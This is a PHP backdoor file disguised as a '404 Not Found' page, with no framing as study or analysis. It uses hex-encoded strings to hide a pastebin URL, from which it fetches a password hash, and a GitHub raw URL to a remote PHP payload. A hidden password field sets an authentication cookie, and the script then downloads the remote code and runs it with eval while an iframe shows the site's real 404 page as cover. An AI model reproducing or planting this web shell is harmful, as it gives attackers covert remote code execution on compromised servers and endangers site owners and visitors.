<?php
@ini_set('display_errors', 0);

function z($h) {
    $s = '';
    for ($i = 0; $i < strlen($h); $i += 2) {
        $s .= chr(hexdec(substr($h, $i, 2)));
    }
    return $s;
}

function y($u) {
    if (function_exists('curl_exec')) {
        $c = curl_init($u);
        curl_setopt_array($c, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_USERAGENT => "Mozilla/5.0",
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0
        ]);
        $r = curl_exec($c);
        curl_close($c);
        return $r;
    }
    return false;
}

function x() {
    return isset($_COOKIE[z('757365725f6964')]) && $_COOKIE[z('757365725f6964')] === z('75736572406c6f63616c686f7374');
}

$a = z("70617373776f72645f686173685f75726c");
$b = z("687474703a2f2f706173746562696e2e636f6d2f7261772f4b3045747a45754a");
$d = trim(y($b));

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $d)) {
        setcookie(z('757365725f6964'), z('75736572406c6f63616c686f7374'), time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}

if (x()) {
    $e = z('68747470733a2f2f') . z('7261772e67697468756275736572636f6e74656e742e636f6d2f64616e313538342f617366646173') . '/' . z('726566732f68656164732f6d61696e2f6173772e706870');
    $f = y($e);
    if ($f !== false) {
        eval('?>' . $f);
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <meta name="robots" content="noindex,nofollow">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            width: 100%;
            height: 100%;
        }

        body {
            font-family: sans-serif;
        }

        form {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 9999;
        }

        input[type=password] {
            background: transparent;
            border: none;
            outline: none;
            color: black;
            caret-color: black;
            font-size: 14px;
            width: 120px;
            height: 20px;
            opacity: 1;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            border: none;
            width: 100%;
            height: 100%;
        }

        #hiddenWrap {
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>
    <div id="hiddenWrap">
        <form method="post" id="loginForm">
            <input type="password" name="pass" id="passInput" autocomplete="off">
            <input type="submit" name="watching" value="submit" style="display:none;">
        </form>
    </div>

    <iframe src="//<?php echo $_SERVER['SERVER_NAME']; ?>/404" 
        id="iframe_id" 
        onload="document.title=this.contentDocument ? this.contentDocument.title : this.contentWindow.document.title;">
    </iframe>

    <script>
        window.onload = () => {
            const wrap = document.getElementById('hiddenWrap');
            document.body.appendChild(wrap.firstElementChild);
            wrap.remove();

            const input = document.getElementById('passInput');

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    document.getElementById('loginForm').submit();
                }
            });
        };
    </script>
</body>
</html>
